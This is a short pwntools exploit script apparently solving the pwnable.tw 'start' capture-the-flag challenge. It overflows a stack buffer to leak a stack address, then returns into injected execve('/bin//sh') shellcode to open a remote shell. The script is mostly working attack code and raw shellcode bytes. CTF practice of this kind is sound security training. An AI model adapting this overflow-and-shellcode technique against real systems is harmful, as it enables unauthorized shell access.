#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./start")
#libc = ELF("./libc.so.6")

context.binary = exe

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw",10000)
    else:
        if args.GDB:
            p = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            """)
        else:
            p = process([exe.path])
    return p


def main():
    p = conn()

    payload = b'A' * 20
    payload += p32(0x08048087)
    p.recv()
    p.send(payload)

    #p.recvline()
    leak = p.recv()

    leak = u32(leak[:4])
    print(f"leak: {hex(leak)}")
    payload2 = b'B' * 20
    payload2 += p32(leak+20)
    payload2 += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

    p.send(payload2)
    

    p.interactive()


if __name__ == "__main__":
    main()
